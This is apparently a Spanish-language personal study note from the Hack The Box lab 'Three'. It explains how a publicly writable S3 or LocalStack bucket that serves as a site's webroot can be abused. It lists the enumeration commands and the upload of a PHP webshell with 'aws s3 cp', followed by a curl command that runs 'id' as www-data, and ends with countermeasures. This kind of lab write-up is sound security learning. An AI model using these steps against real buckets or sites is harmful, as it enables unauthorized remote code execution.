---
tags:
  - tecnica
  - categoria/initial-access
  - os/linux
  - nivel/basico
fecha_aprendida: 2026-09-06
fuente: HTB/Three
mitre_technique: T1190
---
# ⚔️ AWS S3 Bucket Misconfiguration → RCE

> [!abstract] Resumen
> Un bucket S3 (o su emulador LocalStack) con escritura pública, usado como webroot del sitio, permite subir un webshell con `aws s3 cp` y obtener ejecución de comandos. El fallo es de configuración, no un CVE.

---

## ¿Qué es y por qué funciona?

Un bucket S3 mal configurado puede aceptar lectura/escritura sin autenticación válida. Si además ese bucket **es el webroot** que sirve el sitio (patrón común en despliegues estáticos), cualquier archivo subido queda accesible por HTTP y se ejecuta si es `.php`. En entornos de desarrollo con **LocalStack** (emulador de AWS) el problema se agrava: por defecto no valida credenciales (`ENFORCE_IAM` desactivado), así que `aws configure` con valores dummy basta para operar.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - Un endpoint S3/LocalStack alcanzable (a menudo un subdominio tipo `s3.dominio.htb`)
> - Bucket con `PutObject` público, o LocalStack sin `ENFORCE_IAM`
> - El bucket sirve como webroot (lo subido se accede y ejecuta vía HTTP)

---

## Procedimiento

### Detección / Enumeración

```bash
# El sitio revela el dominio → agregarlo a /etc/hosts
echo "<IP> dominio.htb" | sudo tee -a /etc/hosts
# Enumerar subdominios (buscar s3.*)
gobuster vhost -u http://dominio.htb -w subdomains-top1million-5000.txt --append-domain
echo "<IP> s3.dominio.htb" | sudo tee -a /etc/hosts
```

### Explotación

```bash
# Credenciales dummy (LocalStack no valida)
aws configure          # Access/Secret: cualquier valor · region: us-east-1

# Probar el patrón bucket = dominio ANTES de enumerar a ciegas
aws s3 ls s3://dominio.htb --endpoint-url http://s3.dominio.htb

# Subir webshell al bucket (= webroot)
aws s3 cp shell.php s3://dominio.htb --endpoint-url http://s3.dominio.htb

# Ejecutar
curl "http://dominio.htb/shell.php?cmd=id"     # → www-data
```

> [!tip] Variaciones comunes
> - El nombre del bucket suele coincidir con el dominio principal — probar eso primero.
> - Identificar LocalStack por headers HTTP (`x-localstack-target`, `Server`) antes de asumir S3 real.

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| awscli | Interactuar con S3/LocalStack | `aws s3 ls/cp --endpoint-url <url>` |
| gobuster | Descubrir el subdominio S3 | `gobuster vhost -u http://<dominio>` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Bucket policy denegando `PutObject`/`GetObject` públicos (solo el pipeline de deploy escribe). Nunca servir un bucket de object storage directamente como webroot. En LocalStack activar `ENFORCE_IAM`. WAF/validación de tipo si el bucket acepta cargas de usuario (bloquear `.php`, `.jsp`).

---

## Dónde la usé

- [[HTB/Three/Three]] — LocalStack expuesto en `s3.thetoppers.htb`, bucket = dominio, webshell PHP vía `aws s3 cp` → RCE como `www-data`

---

## Referencias

- [MITRE ATT&CK - T1190](https://attack.mitre.org/techniques/T1190/)
- [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
